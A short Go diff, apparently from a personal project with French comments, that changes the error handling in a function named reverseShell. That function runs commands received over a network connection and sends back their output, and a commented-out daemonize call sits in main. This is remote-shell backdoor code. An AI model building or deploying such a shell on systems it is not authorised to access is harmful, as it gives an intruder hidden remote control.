@@ -15,6 +15,7 @@ import (
 
 // To-Do :
 // - afficher prompt
+// - autoriser le client à entrer une commande "quit"
 
 func main() {
 	// daemonize()
@@ -52,10 +53,9 @@ func reverseShell(connexion net.Conn, shell string) {
 		cmdOutput, err := exec.Command(shell, strings.TrimSuffix(clientEntry, "\n")).Output()
 		if err != nil {
 			connexion.Write([]byte("[-] Unknown command.\n"))
+		} else {
+			connexion.Write(append(cmdOutput, "[+] Command sent.\n"...))
 		}
-		_, err = connexion.Write(cmdOutput)
-		connexion.Write([]byte("[+] Command sent.\n"))
-		handleError(err)
 	}
 }
 
